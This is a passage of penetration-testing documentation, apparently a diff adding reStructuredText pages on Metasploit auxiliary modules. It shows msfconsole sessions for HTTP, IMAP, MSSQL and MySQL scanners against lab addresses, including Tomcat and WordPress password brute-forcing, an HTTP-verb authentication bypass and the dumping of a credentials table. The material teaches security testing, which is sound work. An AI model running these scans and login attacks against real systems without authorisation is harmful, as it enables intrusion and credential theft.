+**robots_txt**
+
+The “robots_txt” auxiliary module scans a server or range of servers for the presence and contents of a robots.txt file. These files can frequently contain valuable information that administrators don’t want search engines to discover.
+
+::
+
+  msf > use auxiliary/scanner/http/robots_txt
+ msf auxiliary(robots_txt) > show options
+
+ Module options (auxiliary/scanner/http/robots_txt):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /                yes       The test path to find robots.txt file
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host
+
+
+The configuration for this module is minimal. We simply set the RHOSTS and THEADS values and let it go.
+
+
+::
+
+  msf auxiliary(robots_txt) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(robots_txt) > set THREADS 20
+ THREADS => 20
+ msf auxiliary(robots_txt) > run
+
+ [*] [192.168.1.208] /robots.txt - /internal/, /tmp/
+ [*] [192.168.1.209] /robots.txt - /
+ [*] [192.168.1.211] /robots.txt - /
+ [*] Scanned 15 of 55 hosts (027% complete)
+ [*] Scanned 29 of 55 hosts (052% complete)
+ [*] Scanned 38 of 55 hosts (069% complete)
+ [*] Scanned 39 of 55 hosts (070% complete)
+ [*] Scanned 40 of 55 hosts (072% complete)
+ [*] Scanned 44 of 55 hosts (080% complete)
+ [*] Scanned 45 of 55 hosts (081% complete)
+ [*] Scanned 46 of 55 hosts (083% complete)
+ [*] Scanned 50 of 55 hosts (090% complete)
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(robots_txt) >
+
+
+**ssl**
+
+The “ssl” module queries a host or range of hosts and pull the SSL certificate information if present.
+
+::
+
+  msf > use auxiliary/scanner/http/ssl
+ msf auxiliary(ssl) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    443              yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+To configure the module, we set our RHOSTS and THREADS values and let it run.
+
+::
+
+  msf auxiliary(ssl) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(ssl) > set THREADS 20
+ THREADS => 20
+ msf auxiliary(ssl) > run
+
+ [*] Error: 192.168.1.205: OpenSSL::SSL::SSLError SSL_connect SYSCALL returned=5 errno=0 state=SSLv3 read server hello A
+ [*] Error: 192.168.1.206: OpenSSL::SSL::SSLError SSL_connect SYSCALL returned=5 errno=0 state=SSLv3 read server hello A
+ [*] 192.168.1.208:443 Subject: /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain Signature Alg: md5WithRSAEncryption
+ [*] 192.168.1.208:443 WARNING: Signature algorithm using MD5 (md5WithRSAEncryption)
+ [*] 192.168.1.208:443 has common name localhost.localdomain
+ [*] 192.168.1.211:443 Subject: /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain Signature Alg: sha1WithRSAEncryption
+ [*] 192.168.1.211:443 has common name localhost.localdomain
+ [*] Scanned 13 of 55 hosts (023% complete)
+ [*] Error: 192.168.1.227: OpenSSL::SSL::SSLError SSL_connect SYSCALL returned=5 errno=0 state=SSLv3 read server hello A
+ [*] 192.168.1.223:443 Subject: /CN=localhost Signature Alg: sha1WithRSAEncryption
+ [*] 192.168.1.223:443 has common name localhost
+ [*] 192.168.1.222:443 WARNING: Signature algorithm using MD5 (md5WithRSAEncryption)
+ [*] 192.168.1.222:443 has common name MAILMAN
+ [*] Scanned 30 of 55 hosts (054% complete)
+ [*] Scanned 31 of 55 hosts (056% complete)
+ [*] Scanned 39 of 55 hosts (070% complete)
+ [*] Scanned 41 of 55 hosts (074% complete)
+ [*] Scanned 43 of 55 hosts (078% complete)
+ [*] Scanned 45 of 55 hosts (081% complete)
+ [*] Scanned 46 of 55 hosts (083% complete)
+ [*] Scanned 53 of 55 hosts (096% complete)
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(ssl) >
+
+
+**http_version**
+
+The “http_version” scanner will scan a range of hosts and determine the web server version that is running on them.
+
+::
+
+  msf > use auxiliary/scanner/http/http_version
+ msf auxiliary(http_version) > show options
+
+ Module options (auxiliary/scanner/http/http_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host
+
+
+To run the scan, we set the RHOSTS and THREADS values and let it run.
+
+
+::
+
+  msf auxiliary(http_version) > set RHOSTS 192.168.1.0/24
+ RHOSTS => 192.168.1.0/24
+ msf auxiliary(http_version) > set THREADS 255
+ THREADS => 255
+ msf auxiliary(http_version) > run
+
+ [*] 192.168.1.2 Web Server
+ [*] 192.168.1.1 Apache ( 302-https://192.168.1.1:10443/ )
+ [*] 192.168.1.11
+ [*] Scanned 080 of 256 hosts (031% complete)
+ [*] 192.168.1.101 Apache/2.2.9 (Ubuntu) PHP/5.2.6-bt0 with Suhosin-Patch
+ ...snip...
+ [*] 192.168.1.250 lighttpd/1.4.26 ( 302-http://192.168.1.250/account/login/?next=/ )
+ [*] Scanned 198 of 256 hosts (077% complete)
+ [*] Scanned 214 of 256 hosts (083% complete)
+ [*] Scanned 248 of 256 hosts (096% complete)
+ [*] Scanned 253 of 256 hosts (098% complete)
+ [*] Scanned 256 of 256 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(http_version) >
+
+
+Armed with the knowledge of the target web server software, attacks can be specifically tailored to suit the target.
+
+**tomcat_mgr_login*
+
+The “tomcat_mgr_login” auxiliary module simply attempts to login to a Tomcat Manager Application instance using a provided username and password list.
+
+::
+
+  msf > use auxiliary/scanner/http/tomcat_mgr_login
+ msf auxiliary(tomcat_mgr_login) > show options
+
+ Module options (auxiliary/scanner/http/tomcat_mgr_login):
+
+   Name              Current Setting                                                                 Required  Description
+   ----              ---------------                                                                 --------  -----------
+   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
+   PASSWORD                                                                                          no        The HTTP password to specify for authentication
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                                                            yes       The target address range or CIDR identifier
+   RPORT             8080                                                                            yes       The target port (TCP)
+   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host
+   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
+   THREADS           1                                                                               yes       The number of concurrent threads
+   USERNAME                                                                                          no        The HTTP username to specify for authentication
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
+   VERBOSE           true                                                                            yes       Whether to print output for all attempts
+   VHOST                                                                                             no        HTTP server virtual host
+
+
+
+We will keep the default username and password files, set our RHOSTS and the RPORT of our target and let it run.
+
+::
+
+  msf auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.1.208
+ RHOSTS => 192.168.1.208
+ msf auxiliary(tomcat_mgr_login) > set RPORT 8180
+ RPORT => 8180
+ msf auxiliary(tomcat_mgr_login) > set VERBOSE false
+ VERBOSE => false
+ msf auxiliary(tomcat_mgr_login) > run
+
+ [+] http://192.168.1.208:8180/manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] successful login 'tomcat' : 'tomcat'
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(tomcat_mgr_login) >
+
+
+Our quick scan turned up a default set of tomcat credentials on our target system.
+
+**verb_auth_bypass**
+
+The “verb_auth_bypass” module scans a server or range of servers and attempts to bypass authentication by using different HTTP verbs.
+
+
+::
+
+  msf > use auxiliary/scanner/http/verb_auth_bypass
+ msf auxiliary(verb_auth_bypass) > show options
+
+ Module options (auxiliary/scanner/http/verb_auth_bypass):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The path to test
+   THREADS    1                yes       The number of concurrent threads
+   VHOST                       no        HTTP server virtual host
+
+We configure this module by setting the path to the page requiring authentication, set our RHOSTS value and let the scanner run.
+
+::
+
+  msf auxiliary(verb_auth_bypass) > set PATH /xampp/
+ PATH => /xampp/
+ msf auxiliary(verb_auth_bypass) > set RHOSTS 192.168.1.201
+ RHOSTS => 192.168.1.201
+ msf auxiliary(verb_auth_bypass) > run
+
+ [*] 192.168.1.201 requires authentication: Basic realm="xampp user" [401]
+ [*] Testing verb HEAD resp code: [401]
+ [*] Testing verb TRACE resp code: [200]
+ [*] Possible authentication bypass with verb TRACE code 200
+ [*] Testing verb TRACK resp code: [401]
+ [*] Testing verb WMAP resp code: [401]
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(verb_auth_bypass) >
+
+
+By reading the returned server status codes, the module indicates there is a potential auth bypass by using the TRACE verb on our target.
+
+**webdav_scanner**
+
+The “webdav_scanner” module scans a server or range of servers and attempts to determine if WebDav is enabled. This allows us to better fine-tune our attacks.
+
+::
+
+  msf > use auxiliary/scanner/http/webdav_scanner
+ msf auxiliary(webdav_scanner) > show options
+
+ Module options (auxiliary/scanner/http/webdav_scanner):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /                yes       Path to use
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host
+
+The only configuration we need to do is to set our RHOSTS and THREADS values and let the scanner run.
+
+::
+
+  msf auxiliary(webdav_scanner) > set RHOSTS 192.168.1.200-250
+ RHOSTS => 192.168.1.200-250
+ msf auxiliary(webdav_scanner) > set THREADS 20
+ THREADS => 20
+ msf auxiliary(webdav_scanner) > run
+
+ [*] 192.168.1.203 (Microsoft-IIS/5.1) has WEBDAV ENABLED
+ [*] 192.168.1.209 (Apache/2.0.54 (Linux/SUSE)) WebDAV disabled.
+ [*] 192.168.1.208 (Apache/2.0.52 (CentOS)) WebDAV disabled.
+ [*] 192.168.1.213 (Apache/2.2.14 (Ubuntu)) WebDAV disabled.
+ [*] Scanned 14 of 51 hosts (027% complete)
+ [*] 192.168.1.222 (Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2) WebDAV disabled.
+ [*] 192.168.1.223 (Apache/2.2.14 (Win32) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l mod_autoindex_color PHP/5.3.1 mod_apreq2-20090110/2.7.1 mod_perl/2.0.4 Perl/v5.10.1) WebDAV disabled.
+ [*] 192.168.1.229 (Microsoft-IIS/6.0) has WEBDAV ENABLED
+ [*] 192.168.1.224 (Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6) WebDAV disabled.
+ [*] 192.168.1.227 (Microsoft-IIS/5.0) has WEBDAV ENABLED
+ [*] Scanned 28 of 51 hosts (054% complete)
+ [*] 192.168.1.234 (lighttpd/1.4.25) WebDAV disabled.
+ [*] 192.168.1.235 (Apache/2.2.3 (CentOS)) WebDAV disabled.
+ [*] Scanned 38 of 51 hosts (074% complete)
+ [*] Scanned 51 of 51 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(webdav_scanner) >
+
+
+**webdav_website_content**
+
+The “webdav_website_content” auxiliary module scans a host or range of hosts for servers that disclose their content via WebDav.
+
+::
+
+  msf > use auxiliary/scanner/http/webdav_website_content
+ msf auxiliary(webdav_website_content) > show options
+
+ Module options (auxiliary/scanner/http/webdav_website_content):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /                yes       Path to use
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host
+
+
+As this module can produce a lot of output, we will set RHOSTS to target a single machine and let it run.
+
+
+::
+
+  msf auxiliary(webdav_website_content) > set RHOSTS 192.168.1.201
+ RHOSTS => 192.168.1.201
+ msf auxiliary(webdav_website_content) > run
+
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/aspnet_client/
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/images/
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_private/
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_cnf/
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_cnf/iisstart.htm
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_cnf/pagerror.gif
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_log/
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/access.cnf
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/botinfs.cnf
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/bots.cnf
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/deptodoc.btr
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/doctodep.btr
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/frontpg.lck
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/linkinfo.btr
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/service.cnf
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/service.lck
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/services.cnf
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/svcacl.cnf
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/uniqperm.cnf
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/writeto.cnf
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_script/
+ [*] Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_txt/
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(webdav_website_content) >
+
+
+**wordpress_login_enum**
+
+The “wordpress_login_enum” auxiliary module will brute-force a WordPress installation and first determine valid usernames and then perform a password-guessing attack.
+
+::
+
+  msf > use auxiliary/scanner/http/wordpress_login_enum
+ msf auxiliary(wordpress_login_enum) > show options
+
+ Module options (auxiliary/scanner/http/wordpress_login_enum):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   BLANK_PASSWORDS      false            no        Try blank passwords for all users
+   BRUTEFORCE           true             yes       Perform brute force authentication
+   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS         false            no        Add all users in the current database to the list
+   ENUMERATE_USERNAMES  true             yes       Enumerate usernames
+   PASSWORD                              no        A specific password to authenticate with
+   PASS_FILE                             no        File containing passwords, one per line
+   Proxies                               no        A proxy chain of format type:host:port[,type:host:port][...]
+   RANGE_END            10               no        Last user id to enumerate
+   RANGE_START          1                no        First user id to enumerate
+   RHOSTS                                yes       The target address range or CIDR identifier
+   RPORT                80               yes       The target port (TCP)
+   SSL                  false            no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
+   TARGETURI            /                yes       The base path to the wordpress application
+   THREADS              1                yes       The number of concurrent threads
+   USERNAME                              no        A specific username to authenticate as
+   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS         false            no        Try the username as the password for all users
+   USER_FILE                             no        File containing usernames, one per line
+   VALIDATE_USERS       true             yes       Validate usernames
+   VERBOSE              true             yes       Whether to print output for all attempts
+   VHOST                                 no        HTTP server virtual host
+
+
+We configure the module first by pointing it to the path of wp-login.php on the target server. We then set our username and password files, set the RHOSTS value, and let it run.
+
+::
+
+  msf auxiliary(wordpress_login_enum) > set URI /wordpress/wp-login.php
+ URI => /wordpress/wp-login.php
+ msf auxiliary(wordpress_login_enum) > set PASS_FILE /tmp/passes.txt
+ PASS_FILE => /tmp/passes.txt
+ msf auxiliary(wordpress_login_enum) > set USER_FILE /tmp/users.txt
+ USER_FILE => /tmp/users.txt
+ msf auxiliary(wordpress_login_enum) > set RHOSTS 192.168.1.201
+ RHOSTS => 192.168.1.201
+ msf auxiliary(wordpress_login_enum) > run
+
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Running User Enumeration
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'administrator'
+ [-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'administrator'
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'admin'
+ [+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration- Username: 'admin' - is VALID
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'root'
+ [-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'root'
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'god'
+ [-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'god'
+ [+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Found 1 valid user
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Running Bruteforce
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Skipping all but 1 valid user
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:''
+ [-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'root'
+ [-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'admin'
+ [-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'god'
+ [-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
+ [*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'s3cr3t'
+ [+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - SUCCESSFUL login for 'admin' : 's3cr3t'
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(wordpress_login_enum) >
+
+
+We can see in the above output that the module is efficient as it only brute-forces passwords against valid usernames and our scan did indeed turn up a valid set of credentials.
+
+imap
+"""""
+
+**imap_version**
+
+The “imap_version” auxiliary module is a relatively simple banner grabber for IMAP servers.
+
+::
+
+  msf > use auxiliary/scanner/imap/imap_version
+ msf auxiliary(imap_version) > show options
+
+ Module options (auxiliary/scanner/imap/imap_version):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   IMAPPASS                   no        The password for the specified username
+   IMAPUSER                   no        The username to authenticate as
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     143              yes       The target port
+   THREADS   1                yes       The number of concurrent threads
+
+
+To configure the module, we will only set the RHOSTS and THREADS values and let it run. Note that you can also pass credentials to the module.
+
+::
+
+  msf auxiliary(imap_version) > set RHOSTS 192.168.1.200-240
+ RHOSTS => 192.168.1.200-240
+ msf auxiliary(imap_version) > set THREADS 20
+ THREADS => 20
+ msf auxiliary(imap_version) > run
+
+ [*] 192.168.1.215:143 IMAP * OK [CAPABILITY IMAP4REV1 LOGIN-REFERRALS STARTTLS AUTH=LOGIN] [192.168.1.215] IMAP4rev1 2001.315rh at Sun, 23 Jan 2011 20:47:51 +0200 (IST)\x0d\x0a
+ [*] Scanned 13 of 55 hosts (023% complete)
+ [*] 192.168.1.224:143 IMAP * OK Dovecot ready.\x0d\x0a
+ [*] 192.168.1.229:143 IMAP * OK IMAPrev1\x0d\x0a
+ [*] Scanned 30 of 55 hosts (054% complete)
+ [*] Scanned 31 of 55 hosts (056% complete)
+ [*] Scanned 38 of 55 hosts (069% complete)
+ [*] Scanned 39 of 55 hosts (070% complete)
+ [*] Scanned 40 of 55 hosts (072% complete)
+ [*] 192.168.1.234:143 IMAP * OK localhost Cyrus IMAP4 v2.3.2 server ready\x0d\x0a
+ [*] Scanned 52 of 55 hosts (094% complete)
+ [*] Scanned 53 of 55 hosts (096% complete)
+ [*] Scanned 54 of 55 hosts (098% complete)
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(imap_version) >
+
+
+MSSQL
+"""""""""""
+
+**mssql_ping**
+
+The “mssql_ping” module queries a host or range of hosts on UDP port 1434 to determine the listening TCP port of any MSSQL server, if available. MSSQL randomizes the TCP port that it listens on so this is a very valuable module in the Framework.
+
+::
+
+  msf > use auxiliary/scanner/mssql/mssql_ping
+ msf auxiliary(mssql_ping) > show options
+
+ Module options (auxiliary/scanner/mssql/mssql_ping):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   PASSWORD                              no        The password for the specified username
+   RHOSTS                                yes       The target address range or CIDR identifier
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   THREADS              1                yes       The number of concurrent threads
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+
+To configure the module, we set the RHOSTS and THREADS values and let it run against our targets.
+
+::
+
+  msf auxiliary(mssql_ping) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(mssql_ping) > set THREADS 20
+ THREADS => 20
+ msf auxiliary(mssql_ping) > run
+
+ [*] Scanned 13 of 55 hosts (023% complete)
+ [*] Scanned 16 of 55 hosts (029% complete)
+ [*] Scanned 17 of 55 hosts (030% complete)
+ [*] SQL Server information for 192.168.1.217:
+ [*]    tcp             = 27900
+ [*]    np              = \\SERVER2\pipe\sql\query
+ [*]    Version         = 8.00.194
+ [*]    InstanceName    = MSSQLSERVER
+ [*]    IsClustered     = No
+ [*]    ServerName      = SERVER2
+ [*] SQL Server information for 192.168.1.241:
+ [*]    tcp             = 1433
+ [*]    np              = \\2k3\pipe\sql\query
+ [*]    Version         = 8.00.194
+ [*]    InstanceName    = MSSQLSERVER
+ [*]    IsClustered     = No
+ [*]    ServerName      = 2k3
+ [*] Scanned 32 of 55 hosts (058% complete)
+ [*] Scanned 40 of 55 hosts (072% complete)
+ [*] Scanned 44 of 55 hosts (080% complete)
+ [*] Scanned 45 of 55 hosts (081% complete)
+ [*] Scanned 46 of 55 hosts (083% complete)
+ [*] Scanned 50 of 55 hosts (090% complete)
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(mssql_ping) >
+
+
+As can be seen from the module output, not only does it return the listening TCP port, it returns other valuable information such as the InstanceName and ServerName values.
+
+**mssql_idf**
+
+The “mssql_idf” (Interesting Data Finder) module will connect to a remote MSSQL server using a given set of credentials and search for rows and columns with “interesting” names. This information can help you fine-tune further attacks against the database.
+
+::
+
+  msf > use auxiliary/admin/mssql/mssql_idf
+ msf auxiliary(mssql_idf) > show options
+
+ Module options (auxiliary/admin/mssql/mssql_idf):
+
+   Name      Current Setting         Required  Description
+   ----      ---------------         --------  -----------
+   NAMES     passw|bank|credit|card  yes       Pipe separated list of column names
+   PASSWORD                          no        The password for the specified username
+   RHOST                             yes       The target address
+   RPORT     1433                    yes       The target port
+   USERNAME  sa                      no        The username to authenticate as
+
+
+To configure the module, we will set it to look for field names of ‘username’ and ‘password’, along with a known password for the system, and our RHOST value.
+
+::
+
+  msf auxiliary(mssql_idf) > set NAMES username|password
+ NAMES => username|password
+ msf auxiliary(mssql_idf) > set PASSWORD password1
+ PASSWORD => password1
+ msf auxiliary(mssql_idf) > set RHOST 192.168.1.195
+ RHOST => 192.168.1.195
+ msf auxiliary(mssql_idf) > run
+
+
+ Database Schema Table          Column                Data Type Row Count
+
+ ======== ====== ============== ===================== ========= ========= ======== ====== ============== ===================== ========= =========
+
+ msdb     dbo    sysmail_server username              nvarchar  0
+
+ msdb     dbo    backupmediaset is_password_protected bit       0
+
+ msdb     dbo    backupset      is_password_protected bit       0
+
+ logins   dbo    userpass       username              varchar   3
+
+ logins   dbo    userpass       password              varchar   3
+
+
+ [*] Auxiliary module execution completed
+ msf auxiliary(mssql_idf) >
+
+
+As can be seen in the module output, the scanner found our ‘logins’ database with a ‘userpass’ table containing username and password columns.
+
+**mssql_sql**
+
+The “mssql_sql” module allows you to perform SQL queries against a database using known-good credentials
+
+
+::
+
+  msf > use auxiliary/admin/mssql/mssql_sql
+ msf auxiliary(mssql_sql) > show options
+
+ Module options (auxiliary/admin/mssql/mssql_sql):
+
+   Name                 Current Setting   Required  Description
+   ----                 ---------------   --------  -----------
+   PASSWORD                               no        The password for the specified username
+   RHOST                                  yes       The target address
+   RPORT                1433              yes       The target port (TCP)
+   SQL                  select @@version  no        The SQL query to execute
+   TDSENCRYPTION        false             yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa                no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false             yes       Use windows authentification (requires DOMAIN option set)
+
+
+To configure this module, we set our PASSWORD and RHOST values, then our desired SQL command, and let it run.
+
+::
+
+  msf auxiliary(mssql_sql) > set PASSWORD password1
+ PASSWORD => password1
+ msf auxiliary(mssql_sql) > set RHOST 192.168.1.195
+ RHOST => 192.168.1.195
+ msf auxiliary(mssql_sql) > set SQL use logins;select * from userpass
+ SQL => use logins;select * from userpass
+ msf auxiliary(mssql_sql) > run
+
+ [*] SQL Query: use logins;select * from userpass
+ [*] Row Count: 3 (Status: 16 Command: 193)
+
+
+
+  userid  username  password
+  ------  --------  --------
+  1       bjohnson  password
+  2       aadams    s3cr3t
+  3       jsmith    htimsj
+
+ [*] Auxiliary module execution completed
+ msf auxiliary(mssql_sql) >
+
+
+MySQL
+""""""""""
+
+**mysql_login*
+
+The “mysql_login” auxiliary module is a brute-force login tool for MySQL servers.
+
+::
+
+  msf > use auxiliary/scanner/mysql/mysql_login
+ msf auxiliary(mysql_login) > show options
+
+ Module options (auxiliary/scanner/mysql/mysql_login):
+
+   Name              Current Setting                     Required  Description
+   ----              ---------------                     --------  -----------
+   BLANK_PASSWORDS   false                               no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                   yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                               no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                               no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                               no        Add all users in the current database to the list
+   PASSWORD                                              no        A specific password to authenticate with
+   PASS_FILE         /usr/share/wordlists/fasttrack.txt  no        File containing passwords, one per line
+   Proxies                                               no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                yes       The target address range or CIDR identifier
+   RPORT             3306                                yes       The target port (TCP)
